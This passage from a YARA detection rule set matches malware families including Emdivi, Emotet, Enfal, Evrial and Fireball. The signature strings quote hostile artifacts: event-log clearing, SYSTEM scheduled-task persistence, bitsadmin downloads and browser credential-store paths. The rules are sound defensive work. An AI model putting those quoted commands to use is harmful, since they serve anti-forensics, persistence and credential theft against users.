\"Emdivi malware\"\n        ref = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Emdivi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @Cyber0ps\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emdivi_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"wmic nteventlog where filename=\\\"SecEvent\\\" call cleareventlog\" fullword wide\n        $s0 = \"del %Temp%\\\\*.exe %Temp%\\\\*.dll %Temp%\\\\*.bat %Temp%\\\\*.ps1 %Temp%\\\\*.cmd /f /q\" fullword wide\n        $x3 = \"userControl-v80.exe\" fullword ascii\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword wide\n        $s2 = \"http://www.msftncsi.com\" fullword wide\n        $s3 = \"net use | find /i \\\"c$\\\"\" fullword wide\n        $s4 = \" /del /y & \" fullword wide\n        $s5 = \"\\\\auto.cfg\" fullword wide\n        $s6 = \"/ncsi.txt\" fullword wide\n        $s7 = \"Dcmd /c\" fullword wide\n        $s8 = \"/PROXY\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule Emdivi_Gen2\n{\n    meta:\n        description = \"Emdivi malware\"\n        ref = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Emdivi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @Cyber0ps\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emdivi_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%TEMP%\\\\IELogs\\\\\" fullword ascii\n        $s2 = \"MSPUB.EXE\" fullword ascii\n        $s3 = \"%temp%\\\\\" fullword ascii\n        $s4 = \"\\\\NOTEPAD.EXE\" fullword ascii\n        $s5 = \"%4d-%02d-%02d %02d:%02d:%02d \" fullword ascii\n        $s6 = \"INTERNET_OPEN_TYPE_PRECONFIG\" fullword ascii\n        $s7 = \"%4d%02d%02d%02d%02d%02d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1300KB and 6 of them\n}\n\nrule Emdivi_Gen3\n{\n    meta:\n        description = \"Emdivi malware\"\n        ref = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Emdivi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @Cyber0ps\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emdivi_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword ascii\n        $s2 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\" fullword ascii\n        $s4 = \"\\\\auto.cfg\" fullword ascii\n        $s5 = \"/ncsi.txt\" fullword ascii\n        $s6 = \"/en-us/default.aspx\" fullword ascii\n        $s7 = \"cmd /c\" fullword ascii\n        $s9 = \"APPDATA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 850KB and (($x1 and 1 of ($s*)) or (4 of ($s*)))\n}\n\nrule Emdivi_Gen4\n{\n    meta:\n        description = \"Emdivi malware\"\n        ref = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Emdivi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @Cyber0ps\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emdivi_Gen4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".http_port\\\", \" fullword wide\n        $s2 = \"UserAgent: \" fullword ascii\n        $s3 = \"AUTH FAILED\" fullword ascii\n        $s4 = \"INVALID FILE PATH\" fullword ascii\n        $s5 = \".autoconfig_url\\\", \\\"\" fullword wide\n        $s6 = \"FAILED TO WRITE FILE\" fullword ascii\n        $s7 = \".proxy\" fullword wide\n        $s8 = \"AuthType: \" fullword ascii\n        $s9 = \".no_proxies_on\\\", \\\"\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 853KB and all of them\n}\n\nrule Emissary_APT_Malware_1\n{\n    meta:\n        description = \"Emissary trojan\"\n        ref = \"http://goo.gl/V0epcf\"\n        classifications = \"Trojan\"\n        threat_names = \"Emissary\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emissary_APT_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c %s > %s\" fullword ascii\n        $s2 = \"execute cmd timeout.\" fullword ascii\n        $s3 = \"rundll32.exe \\\"%s\\\",Setting\" fullword ascii\n        $s4 = \"DownloadFile - exception:%s.\" fullword ascii\n        $s5 = \"CDllApp::InitInstance() - Evnet create successful.\" fullword ascii\n        $s6 = \"UploadFile - EncryptBuffer Error\" fullword ascii\n        $s7 = \"WinDLL.dll\" fullword wide\n        $s8 = \"DownloadFile - exception:%s,code:0x%08x.\" fullword ascii\n        $s9 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" fullword ascii\n        $s10 = \"CDllApp::InitInstance() - Evnet already exists.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and 3 of them\n}\n\nrule EmotetMAPI64bit {\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Emotet MAPI Module\"\n        threat_names = \"Emotet\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n\n    strings:\n        // .text:0000000140005620 8B C6                                   mov     eax, esi\n        // .text:0000000140005622 48 89 7D 77                             mov     [rbp+57h+arg_10], rdi\n        // .text:0000000140005626 48 03 C0                                add     rax, rax\n        // .text:0000000140005629 48 8B 4C C3 10                          mov     rcx, [rbx+rax*8+10h]\n        // .text:000000014000562E 48 8B DF                                mov     rbx, rdi\n        // .text:0000000140005631 48 8B 41 50                             mov     rax, [rcx+50h]\n        // .text:0000000140005635 4C 8B 71 20                             mov     r14, [rcx+20h]\n\n        // .text:0000000140005639 66 83 38 53                             cmp     word ptr [rax], 53h ; 'S'\n        // .text:000000014000563D 75 26                                   jnz     short loc_140005665\n        // .text:000000014000563F 66 83 78 02 4D                          cmp     word ptr [rax+2], 4Dh ; 'M'\n        // .text:0000000140005644 75 1F                                   jnz     short loc_140005665\n        // .text:0000000140005646 66 83 78 04 54                          cmp     word ptr [rax+4], 54h ; 'T'\n        // .text:000000014000564B 75 18                                   jnz     short loc_140005665\n        // .text:000000014000564D 66 83 78 06 50                          cmp     word ptr [rax+6], 50h ; 'P'\n        // .text:0000000140005652 75 11                                   jnz     short loc_140005665\n\n        // .text:0000000140005654 48 8B 49 38                             mov     rcx, [rcx+38h]\n        // .text:0000000140005658 49 8B D6                                mov     rdx, r14\n        $smtp = {\n            66 83 38 53\n            75 ??\n            66 83 78 02 4D\n            75 ??\n            66 83 78 04 54\n            75 ??\n            66 83 78 06 50\n            75 ??\n            48 8B 49\n        }\n\n    condition:\n        $smtp\n}\n\nrule EmotetMAPI {\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Emotet MAPI Module\"\n        threat_names = \"Emotet\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n    strings:\n        // .text:004057D0 8B 01                          mov     eax, [ecx]\n        // .text:004057D2 66 83 38 53                    cmp     word ptr [eax], 53h ; 'S'\n        // .text:004057D6 75 1C                          jnz     short loc_4057F4\n        // .text:004057D8 66 83 78 02 4D                 cmp     word ptr [eax+2], 4Dh ; 'M'\n        // .text:004057DD 75 15                          jnz     short loc_4057F4\n        // .text:004057DF 66 83 78 04 54                 cmp     word ptr [eax+4], 54h ; 'T'\n        // .text:004057E4 75 0E                          jnz     short loc_4057F4\n        // .text:004057E6 66 83 78 06 50                 cmp     word ptr [eax+6], 50h ; 'P'\n        // .text:004057EB 75 07                          jnz     short loc_4057F4\n        // .text:004057ED 66 83 78 08 3A                 cmp     word ptr [eax+8], 3Ah ; ':'\n        // .text:004057F2 74 09                          jz      short loc_4057FD\n        $smtp = {\n            8B ??\n            66 83 38 53\n            75 ??\n            66 83 78 02 4D\n            75 ??\n            66 83 78 04 54\n            75 ??\n            66 83 78 06 50\n            75 ??\n            66 83 78 08 3A\n            74\n        }\n\n    condition:\n        $smtp\n}\n\nrule EmotetConnectionVerifier {\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Emotet Connection Verifier Module\"\n        threat_names = \"Emotet\"\n        classifications = \"Downloader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        sample = \"022a5dfe18ee332c020a245cac64f4aa4fc5dd528f79923d00d8ffe376fc76da\"\n        reference = \"https://research.checkpoint.com/emotet-tricky-trojan-git-clones/\"\n    strings:\n        // .text:10029A30 55                                      push    ebp\n        // .text:10029A31 8B EC                                   mov     ebp, esp\n        // .text:10029A33 51                                      push    ecx\n        // .text:10029A34 6A 00                                   push    0\n        // .text:10029A36 6A 04                                   push    4\n        // .text:10029A38 8D 45 FC                                lea     eax, [ebp+var_4]\n        // .text:10029A3B C7 45 FC 48 45 4C 4F                    mov     [ebp+var_4], 'OLEH'\n        // .text:10029A42 50                                      push    eax\n        // .text:10029A43 FF 75 0C                                push    [ebp+arg_4]\n        // .text:10029A46 FF 15 DC 4A 03 10                       call    dword_10034ADC\n        // .text:10029A4C FF 75 0C                                push    [ebp+arg_4]\n        // .text:10029A4F FF 15 C0 4A 03 10                       call    dword_10034AC0\n        // .text:10029A55 8B E5                                   mov     esp, ebp\n        // .text:10029A57 5D                                      pop     ebp\n        // .text:10029A58 C3                                      retn\n        $oleh_sub = { 55 8B EC 51 6A 00 6A 04 8D 45 FC C7 45 FC 48 45 4C 4F 50 FF 75 0C FF 15 ?? ?? ?? ?? FF 75 0C FF 15 ?? ?? ?? ?? 8B E5 5D C3 }\n    condition:\n       $oleh_sub\n}\n\nrule Enfal_Malware\n{\n    meta:\n        description = \"Enfal backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Enfal\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Enfal_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"POWERPNT.exe\" fullword ascii\n        $s1 = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n        $s2 = \"%HOMEPATH%\" fullword ascii\n        $s3 = \"Server2008\" fullword ascii\n        $s4 = \"Server2003\" fullword ascii\n        $s5 = \"Server2003R2\" fullword ascii\n        $s6 = \"Server2008R2\" fullword ascii\n        $s9 = \"%HOMEDRIVE%\" fullword ascii\n        $s13 = \"%ComSpec%\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule Enfal_Malware_Backdoor\n{\n    meta:\n        description = \"Enfal backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Enfal\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Enfal_Malware_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Micorsoft Corportation\" fullword wide\n        $x2 = \"IM Monnitor Service\" fullword wide\n        $s1 = \"imemonsvc.dll\" fullword wide\n        $s2 = \"iphlpsvc.tmp\" fullword\n        $z1 = \"urlmon\" fullword\n        $z2 = \"Registered trademarks and service marks are the property of their respec\" wide\n        $z3 = \"XpsUnregisterServer\" fullword\n        $z4 = \"XpsRegisterServer\" fullword\n        $z5 = \"{53A4988C-F91F-4054-9076-220AC5EC03F3}\" fullword\n\n    condition:\n        uint16(0) == 0x5a4d and (1 of ($x*) or (all of ($s*) and all of ($z*)))\n}\n\nprivate rule EnfalCode : Enfal Family\n{\n    meta:\n        description = \"Enfal code tricks\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"EnfalCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $decrypt = { B0 20 2A C3 00 04 33 56 43 FF D7 3B D8 }\n\n    condition:\n        any of them\n}\n\nprivate rule EnfalStrings : Enfal Family\n{\n    meta:\n        description = \"Enfal Identifying Strings\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"EnfalStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"D:\\\\work\\\\\\xe6\\xba\\x90\\xe5\\x93\\xa5\\xe5\\x85\\x8d\\xe6\\x9d\\x80\\\\tmp\\\\Release\\\\ServiceDll.pdb\"\n        $ = \"e:\\\\programs\\\\LuridDownLoader\"\n        $ = \"LuridDownloader for Falcon\"\n        $ = \"DllServiceTrojan\"\n        $ = \"\\\\k\\\\\\xe6\\xa1\\x8c\\xe8\\x9d\\xa2\\\\\"\n        $ = \"EtenFalcon\\xef\\xbc\\x88\\xe4\\xbf\\xae\\xe6\\x94\\xb9\\xef\\xbc\\x89\"\n        $ = \"Madonna\\x00Jesus\"\n        $ = \"/iupw82/netstate\"\n        $ = \"fuckNodAgain\"\n        $ = \"iloudermao\"\n        $ = \"Crpq2.cgi\"\n        $ = \"Clnpp5.cgi\"\n        $ = \"Dqpq3ll.cgi\"\n        $ = \"dieosn83.cgi\"\n        $ = \"Rwpq1.cgi\"\n        $ = \"/Ccmwhite\"\n        $ = \"/Cmwhite\"\n        $ = \"/Crpwhite\"\n        $ = \"/Dfwhite\"\n        $ = \"/Query.txt\"\n        $ = \"/Ufwhite\"\n        $ = \"/cgl-bin/Clnpp5.cgi\"\n        $ = \"/cgl-bin/Crpq2.cgi\"\n        $ = \"/cgl-bin/Dwpq3ll.cgi\"\n        $ = \"/cgl-bin/Owpq4.cgi\"\n        $ = \"/cgl-bin/Rwpq1.cgi\"\n        $ = \"/trandocs/mm/\"\n        $ = \"/trandocs/netstat\"\n        $ = \"NFal.exe\"\n        $ = \"LINLINVMAN\"\n        $ = \"7NFP4R9W\"\n\n    condition:\n        any of them\n}\n\nrule Enfal : Family\n{\n    meta:\n        description = \"Enfal backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Enfal\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"Enfal\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        EnfalCode or EnfalStrings\n}\n\nrule evora\n{\n    meta:\n        description = \"Evora malware\"\n        threat_names = \"Evora\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"evora\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $a1 = \"{A872638D-DC2B9B23}\"\n        $a2 = \"Mozilla/4.0 (compatible; MSIE 8.0)\" wide\n        $a3 = \"/%x/thread_%02d%02d%02d%02d.html\" wide\n        $a4 = \"F95F6E38\" wide\n        $b1 = \"{A872638D-DC2B9B23}\"\n        $b2 = \"{F40150C7-B623-41bc-8693-0445343A3A69}\" wide\n        $b3 = \"Global\\\\%d\" wide\n\n    condition:\n        all of ($a*) or all of ($b*)\n}\n\nrule Envrial_Jan18_1\n{\n    meta:\n        description = \"Evrial credential stealer\"\n        ref = \"https://twitter.com/malwrhunterteam/status/953313514629853184\"\n        classifications = \"Spyware\"\n        threat_names = \"Evrial\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Envrial_Jan18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"/Evrial/master/domen\" wide\n        $a1 = \"\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n        $a2 = \"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n        $a3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n        $a4 = \"\\\\Orbitum\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n        $a5 = \"\\\\Kometa\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n        $s1 = \"dlhosta.exe\" fullword wide\n        $s2 = \"\\\\passwords.log\" fullword wide\n        $s3 = \"{{ <>h__TransparentIdentifier1 = {0}, Password = {1} }}\" fullword wide\n        $s4 = \"files/upload.php?user={0}&hwid={1}\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*) or 3 of them or 2 of ($s*))\n}\n\nrule F0xy_downloader\n{\n    meta:\n        description = \"F0xy bot downloader\"\n        classifications = \"Bot, Downloader\"\n        threat_names = \"F0xy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Nick Griffin (Websense)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ws_f0xy_downloader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"bitsadmin /transfer\"\n        $string2 = \"del rm.bat\"\n        $string3 = \"av_list=\"\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($string*))\n}\n\nrule Fareit_Trojan_Oct15\n{\n    meta:\n        description = \"Fareit trojan\"\n        ref = \"http://goo.gl/5VYtlU\"\n        classifications = \"Trojan\"\n        threat_names = \"Fareit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fareit_Trojan_Oct15\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ebai.exe\" fullword wide\n        $s2 = \"Origina\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and $s1 in (0 .. 30000) and $s2 in (0 .. 30000)\n}\n\nrule FastPOS : FastPOS POS keylogger\n{\n    meta:\n        description = \"FastPOS keyloggger and scraper\"\n        ref = \"http://documents.trendmicro.com/assets/fastPOS-quick-and-easy-credit-card-theft.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"FastPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Trend Micro, Inc.\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PoS_Malware_fastpos\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"uniqyeidclaxemain\"\n        $string2 = \"http://%s/cdosys.php\"\n        $string3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\"\n        $string4 = \"\\\\The Hook\\\\Release\\\\The Hook.pdb\" nocase\n\n    condition:\n        all of ($string*)\n}\n\nrule Fireball_de_svr\n{\n    meta:\n        description = \"Fireball malware downloader (file: de_svr.exe)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_de_svr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c MD \" fullword ascii\n        $s2 = \"rundll32.exe \\\"%s\\\",%s\" fullword wide\n        $s3 = \"http://d12zpbetgs1pco.cloudfront.net/Weatherapi/shell\" fullword wide\n        $s4 = \"C:\\\\v3\\\\exe\\\\de_svr_inst.pdb\" fullword ascii\n        $s5 = \"Internet Connect Failed!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 3000KB and 4 of them)\n}\n\nrule Fireball_lancer\n{\n    meta:\n        description = \"Fireball malware downloader (file: lancer.dll)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_lancer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\instlsp\\\\Release\\\\Lancer.pdb\" ascii\n        $x2 = \"lanceruse.dat\" fullword wide\n        $s1 = \"Lancer.dll\" fullword ascii\n        $s2 = \"RunDll32.exe \\\"\" fullword wide\n        $s3 = \"Micr.dll\" fullword wide\n        $s4 = \"AG64.dll\" fullword wide\n        $s5 = \"\\\",Start\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and (1 of ($x*) or 3 of ($s*))) or (6 of them)\n}\n\nrule Fireball_chrome_elf\n{\n    meta:\n        description = \"Fireball malware downloader (file: chrome_elf.dll)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"chrome_elf\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x2 = \"schtasks /Create /SC HOURLY /MO %d /ST 00:%02d:00 /TN \\\"%s\\\" /TR \\\"%s\\\" /RU \\\"SYSTEM\\\"\" fullword wide\n        $s6 = \"aHR0cDovL2R2Mm0xdXVtbnNndHUuY2xvdWRmcm9udC5uZXQvdjQvZ3RnLyVzP2FjdGlvbj12aXNpdC5jaGVsZi5pbnN0YWxs\" fullword ascii\n        $s7 = \"QueryInterface call failed for IExecAction: %x\" fullword ascii\n        $s10 = \"%s %s,Rundll32_Do %s\" fullword wide\n        $s13 = \"Failed to create an instance of ITaskService: %x\" fullword ascii\n        $s16 = \"Rundll32_Do\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 4 of them)\n}\n\nrule Fireball_regkey\n{\n    meta:\n        description = \"Fireball malware downloader (file: regkey.exe)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_regkey\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\WinMain\\\\Release\\\\WinMain.pdb\" fullword ascii\n        $s2 = \"ScreenShot\" fullword wide\n        $s3 = \"WINMAIN\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule Fireball_winsap\n{\n    meta:\n        description = \"Fireball malware downloader (file: winsap.dll)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_winsap\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"aHR0cDovL2\" ascii\n        $s2 = \"%s\\\\svchost.exe -k %s\" fullword wide\n        $s3 = \"\\\\SETUP.dll\" fullword wide\n        $s4 = \"WinSAP.dll\" fullword ascii\n        $s5 = \"Error %u in WinHttpQueryDataAvailable.\" fullword ascii\n        $s6 = \"UPDATE OVERWRITE\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 4 of them)\n}\n\nrule Fireball_archer\n{\n    meta:\n        description = \"Fireball malware downloader (file: archer.dll)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_archer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\archer_lyl\\\\Release\\\\Archer_Input.pdb\" fullword ascii\n        $s1 = \"Archer_Input.dll\" fullword ascii\n        $s2 = \"InstallArcherSvc\" fullword ascii\n        $s3 = \"%s_%08X\" fullword wide\n        $s4 = \"d\\\\\\\\.\\\\PhysicalDrive%d\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and ($x1 or 3 of them)\n}\n\nrule Fireball_clearlog\n{\n    meta:\n        description = \"Fireball malware downloader (file: clearlog.dll)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"clearlog\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\ClearLog\\\\Release\\\\logC.pdb\" ascii\n        $s1 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \\\"\\\"\" fullword wide\n        $s2 = \"logC.dll\" fullword ascii\n        $s3 = \"hhhhh.exe\" fullword wide\n        $s4 = \"ttttt.exe\" fullword wide\n        $s5 = \"Logger Name:\" fullword ascii\n        $s6 = \"cle.log.1\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and $x1 or 2 of them)\n}\n\nrule Fireball_gubed\n{\n    meta:\n        description = \"Fireball malware downloader (file: gubed.exe)\"\n        ref = \"https://goo.gl/4pTkGQ\"\n        classifications = \"Downloader\"\n        threat_names = \"Fireball\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fireball_gubed\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\MRT.exe\" fullword wide\n        $x2 = \"tIphlpapi.dll\" fullword wide\n        $x3 = 